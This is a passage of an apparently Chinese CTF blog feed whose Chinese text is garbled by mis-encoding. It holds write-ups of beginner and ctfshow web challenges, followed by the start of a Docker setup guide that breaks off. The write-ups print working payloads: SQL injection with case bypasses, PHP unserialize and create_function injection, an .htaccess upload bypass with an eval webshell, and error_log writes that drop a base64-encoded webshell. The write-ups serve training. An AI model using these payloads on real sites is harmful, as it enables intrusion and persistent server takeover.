å¯†å­—ç¬¦&quot;</span>;</span><br><span class="line"><span class="variable">$stringb</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$stringa</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="string">&#x27;UCS-2BE&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stringb</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-sql">ez_sql</h2><p>sqlæ³¨å…¥ï¼Œå¤§å†™ç»•è¿‡ï¼Œåˆ—æ•°5åˆ—ï¼Œç›´æ¥çœ‹å‡ºæ¥çš„</p><p>çˆ†åº“å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> Select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,dataabse() --+</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unioN</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,Group_Concat(<span class="built_in">Table_nAme</span>) <span class="keyword">fRom</span> infoRmAtion_schemA.<span class="keyword">tAbles</span> <span class="keyword">whEre</span> tAble_schemA=<span class="string">&#x27;ctf&#x27;</span> #</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,gRoup_coNcat(<span class="built_in">cOlumn_nAme</span>) <span class="keyword">fRom</span> infOrmAtion_schEma.<span class="keyword">cOlumns</span> <span class="keyword">whEre</span> <span class="built_in">tAble_Name</span>=<span class="string">&#x27;here_is_flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>çˆ†å†…å®¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> sElect <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,gRoup_cOncat(flag) fRom here_is_flag --+</span><br></pre></td></tr></table></figure><h2 id="Unserializeï¼Ÿ">Unserializeï¼Ÿ</h2><p>å®ä¾‹åŒ–ç±»è‡ªåŠ¨è§¦å‘destructç±»ï¼Œåˆ©ç”¨echoè§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><strong>payloadï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again">Upload again!</h2><p>ç»è¿‡æµ‹è¯•å‘ç°æ˜¯å¯¹shellçš„å†…å®¹è¿›è¡Œäº†æ£€æŸ¥ï¼Œæ„Ÿè§‰æ˜¯æ£€æŸ¥äº†é—®å·ï¼Œæ–‡ä»¶åç¼€ä¹Ÿåšäº†è¿‡æ»¤ï¼ŒphpæŒ‡å®šæ˜¯ä¼ ä¸ä¸Šå»äº†ï¼Œè¿™é‡Œä½¿ç”¨.htaccessé…ç½®æ–‡ä»¶è§£æ.jpgåç¼€è¿›è¡Œç»•è¿‡</p><p>.htaccess</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>chu0.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;chu0&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013203719913.png" alt="image-20231013203719913"></p><h2 id="R-C-E">R!!C!!E!!</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ª.gitä¿¡æ¯æ³„éœ²ï¼Œç”¨GitHack-masterè·å–.gitçš„å†…å®¹</p><p>æºç å¦‚ä¸‹ï¼šbo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»å…¸çš„æ— å‚æ•°rceï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(array_pop(getallheaders()));   //getall...è·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œpopå‡ºæœ€åä¸€ä¸ªè¿›è¡Œeval</span><br></pre></td></tr></table></figure><p>è¯·æ±‚å¤´æ·»åŠ </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZZZsd123</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span><br><span class="line">//è¿™é‡Œæ³¨æ„ï¼Œè¯·æ±‚å¤´çš„é¦–å­—æ¯ä¸€å®šé åï¼Œè¿™æ ·æ‰èƒ½ä¿è¯ä»–æ˜¯è¯·æ±‚å¤´çš„æœ€åä¸€ä¸ªï¼Œæ‰èƒ½è¢«evalæ­£ç¡®çš„æ‰§è¡Œ</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ–°æ‰‹èµ›ï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOWçº¢åŒ…é¢˜ç›®</title>
    <link href="https://bowuchuling.github.io/posts/1824e02a.html"/>
    <id>https://bowuchuling.github.io/posts/1824e02a.html</id>
    <published>2023-08-13T12:07:05.818Z</published>
    <updated>2023-08-13T13:24:45.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOWçº¢åŒ…é¢˜ç›®"><a href="#CTFSHOWçº¢åŒ…é¢˜ç›®" class="headerlink" title="CTFSHOWçº¢åŒ…é¢˜ç›®"></a>CTFSHOWçº¢åŒ…é¢˜ç›®</h1><h3 id="çº¢åŒ…7"><a href="#çº¢åŒ…7" class="headerlink" title="çº¢åŒ…7"></a>çº¢åŒ…7</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ç¬¬ä¸€æ¬¡è§åˆ°äº†extractå‡½æ•°ï¼Œç™¾åº¦ä¹‹åçŸ¥é“äº†æ˜¯ä¸€ä¸ªèµ‹å€¼å‡½æ•°ï¼Œä¸»è¦ç”¨äºå˜é‡è¦†ç›–æ–¹é¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20230813202700381.png" alt="image-20230813202700381"></p><p>å¤§è‡´æ„æ€å°±æ˜¯</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¼ å…¥:</span><br><span class="line">?<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">$<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">ç»™<span class="keyword">name</span>è¿›è¡Œäº†ä¸€æ³¢èµ‹å€¼</span><br></pre></td></tr></table></figure><p>ini_set()å‡½æ•°å¯ä»¥å¯¹php.iniè¿›è¡Œé…ç½®ï¼Œçœ‹äº†wpä¹‹åçŸ¥é“è¿™é¢˜æ˜¯éœ€è¦æ›´æ”¹æŠ¥é”™æ—¥å¿—è·¯å¾„è¿›è€Œå†™å…¥æ¶æ„å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1ï¼š</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">è¿™é‡Œè¿˜ç”¨åˆ°äº†ä¸€ä¸ªæŠ€å·§ï¼Œç³»ç»Ÿå‘½ä»¤å¯ä»¥ä½¿ç”¨%<span class="number">00</span>è¿›è¡Œæˆªæ–­ï¼Œè¿›è€Œè§¦å‘æŠ¥é”™ï¼Œè€ŒæŠ¥é”™ä¼šæŠŠæ‰€æœ‰çš„æŠ¥é”™ä¿¡æ¯å…¨éƒ¨å†™å…¥æŠ¥é”™æ—¥å¿—å½“ä¸­ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ini_setä¿®æ”¹æŠ¥é”™æ—¥å¿—çš„å‚¨å­˜è·¯å¾„ï¼Œè¿›è€Œå®ç°äº†æ¶æ„å‘½ä»¤çš„å†™å…¥ã€‚ç±»ä¼¼äºåŒ…å«æ—¥å¿—ã€‚</span><br><span class="line">payload2ï¼š</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">2</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&#x27; | base64 -d &gt; /var/www/html/chu1.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="çº¢åŒ…8"><a href="#çº¢åŒ…8" class="headerlink" title="çº¢åŒ…8"></a>çº¢åŒ…8</h2><p><strong>æºä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿçš„æ˜¯create_function()çš„åšæ³•ï¼Œä¹‹å‰æ¥è§¦è¿‡ä¸¤ä¸ªç›¸å…³é¢˜ç›®ï¼Œä¸è¿‡éƒ½æ˜¯åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸Šåšæ–‡ç« ï¼Œå¤šæ¬¡æµ‹è¯•ä¹‹åå‘ç°ç”±äºbase64ç¼–ç çš„é™åˆ¶ä¼¼ä¹æ— è®¡å¯æ–½ï¼Œå°è¯•æ‰€æœ‰è¯¥ç¼–ç å‡½æ•°çš„æ¼æ´ï¼Œæ²¡æŸ¥åˆ°ã€‚æœ€åä¸€æ‹›ï¼Œæ‘‡äººã€‚å¾—åˆ°äº†payloadï¼Œåç»­ç½‘ä¸Šæœå¾—åˆ°äº†ä»¥ä¸‹åšå®¢ï¼š<a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail">https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail</a></p><p>è¿™é‡Œæ˜¯åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸Šåšæ–‡ç« ï¼Œä¸¾ä¾‹</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&quot;<span class="variable">$a</span>=123&quot;</span>,<span class="string">&quot;return 1;&quot;</span>)</span><br><span class="line"></span><br><span class="line">è¯¥å‡½æ•°å¤„ç†ä¹‹åå°†ä¼šå¾—åˆ°ä»¥ä¸‹åŒ¿åå‡½æ•°</span><br><span class="line"></span><br><span class="line">name1(<span class="variable">$a</span>=<span class="number">123</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®è¿›è¡Œé—­åˆ</span><br><span class="line"><span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;phpinfo()<span class="comment">;/*</span></span><br><span class="line">è¿™ä¸ªæ—¶å€™å°±å¯ä»¥æ‰§è¡Œä»»æ„phpä»£ç å•¦</span><br><span class="line">?<span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;<span class="params">system</span>(<span class="string">&quot;cat /f*&quot;</span>)<span class="comment">;/*&amp;value=1</span></span><br><span class="line">å¾—åˆ°flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctfshowï¼Œç‹ ç‹ æå°ç±³ï¼</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºä½¿ç”¨dockerçš„ä¸€äº›æ„Ÿæƒ³ï¼ŒæŒç»­æ›´æ–°ä¸­...</title>
    <link href="https://bowuchuling.github.io/posts/7ea82466.html"/>
    <id>https://bowuchuling.github.io/posts/7ea82466.html</id>
    <published>2023-07-26T17:10:39.718Z</published>
    <updated>2023-07-28T05:43:38.450Z</updated>
    
    <content type="html"><![CDATA[<p>  dockeræ•™ç¨‹å…¶å®å¾ˆæ—©å°±åœ¨é…é…¿äº†ï¼Œä½†å› ä¸ºè‡ªå·±å¤©èµ‹ä¸é«˜ï¼Œæä¸æ˜ç™½ï¼Œä¸€ç›´æ²¡æœ‰å‡ºï¼Œè¿‘æœŸç”±äºæœ‰å‡ºé¢˜éœ€æ±‚ï¼Œä¸å¾—ä¸åˆæ‹¾èµ·vmé‡Œè—ç°äº†çš„dockerï¼Œåˆæ·±å…¥å­¦ä¹ äº†ä¸€ç•ªï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°ç½‘ä¸Šçš„å„ç§åšå®¢ï¼Œçœ‹äº†å¥½é•¿æ—¶é—´éƒ½çœ‹ä¸æ‡‚ï¼Œæµªè´¹äº†å¤§æŠŠæ—¶é—´ï¼Œç”±æ­¤è¢«æˆ‘æˆäºˆäº†æ— è‰¯åšå®¢çš„å¤´è¡”ã€‚è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯ä»‹ç»ä¸€ä¸‹CTFä¸­å‡ºé¢˜æ‰€éœ€è¦çš„dockeræ“ä½œã€‚æŒç»­æ›´æ–°ä¸­â€¦â€¦</p><h2 id="dockeré…ç½®æ•™ç¨‹"><a href="#dockeré…ç½®æ•™ç¨‹" class="headerlink" title="dockeré…ç½®æ•™ç¨‹"></a>dockeré…ç½®æ•™ç¨‹</h2><h3 id="æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰"><a href="#æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰" class="headerlink" title="æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰"></a>æ›´æ¢é•œåƒæºï¼ˆé˜¿é‡Œäº‘ï¼‰</h3><p><strong>é€‰æ‹©æ€§æ›´æ¢ï¼Œå¦‚æœå†è¿›è¡Œä¸‹é¢æŒ‡ä»¤æ—¶æ²¡æœ‰æŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©ä¸æ›´æ¢</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//æ‰“å¼€å­˜æºæ–‡ä»¶</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//è¿›å…¥ç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">å°†åœ°å€é»è´´è¿›å»</span><br><span class="line">æŒ‰ESC                           <span class="comment">//é€€å‡ºç¼–è¾‘æ¨¡å¼</span></span><br><span class="line">è¾“å…¥:wq                         <span class="comment">//ä¿å­˜å¹¶é€€å‡º</span></span><br></pre></td></tr></table></figure><p><strong>é•œåƒæºåœ°å€ï¼Œå…¨éƒ¨å¤åˆ¶è¿›å»</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºdocker"><a href="#åˆ›å»ºdocker" class="headerlink" title="åˆ›å»ºdocker"></a>åˆ›å»ºdocker</h3><p><strong>1.ä¸‹è½½dockeré•œåƒ</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.æœç´¢\ä¸‹è½½ æœåŠ¡å™¨é•œåƒ</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>æœç´¢æœåŠ¡å™¨é•œåƒï¼Œå¯ä»¥ä¸æœ</span><br><span class="line">docker pull é•œåƒå    <span class="regexp">//</span>ä¾‹å¦‚docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.åˆ›å»ºdocker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name ç»™dockerå–ä¸ªå -p æƒ³å¼€æ”¾çš„ç«¯å£:80 æœåŠ¡å™¨é•œåƒå</span></span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//åˆ›å»ºtutum/lampæœåŠ¡å™¨ï¼Œå‘½åä¸ºdockername1ï¼Œå¼€æ”¾<span class="number">180</span>ç«¯å£ä¾›è®¿é—®</span><br></pre></td></tr></table></figure><p><strong>4.æ™®é€šé¢˜ç›®å¤åˆ¶</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æŠŠæ–‡ä»¶æ‹‰åˆ°linuxç›®å½•ä¸‹</span><br><span class="line">docker cp æ–‡ä»¶å dockerå<span class="symbol">:/var/www/html</span>   </span><br><span class="line">/<span class="regexp">/æŠŠæ–‡ä»¶å¤åˆ¶åˆ°dockerçš„/var</span><span class="regexp">/www/html</span>ç›®å½•ä¸‹ï¼Œè®°å¾—å‘½åä¸€ä¸ªindex.phpï¼Œæ–‡ä»¶çš„å…¶ä»–äººæƒé™å¾—è®¾ç½®æˆå¯è¯»</span><br></pre></td></tr></table></figure><p><strong>5.ï¼ˆå¯æœ‰å¯æ— ï¼‰è¿›å…¥dockeræŸ¥çœ‹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockerå <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>è¿›å…¥ä¹‹åå°±éšä¾¿å‘½ä»¤æ‰§è¡Œå°±å¥½äº†ï¼Œæ²¡é—®é¢˜å°±è®¿é—®å®¿ä¸»æœºip+ç«¯å£çœ‹çœ‹ï¼Œèƒ½è®¿é—®å°±æ²¡é—®é¢˜</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><p><strong>æŸ¥çœ‹dockerå®¹å™¨çŠ¶æ€</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">ps</span>  </span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹dockeré•œåƒçŠ¶æ€</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºdockerå®¹å™¨</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name èµ·ä¸ªå -p å¼€æ”¾ç«¯å£:æ˜ 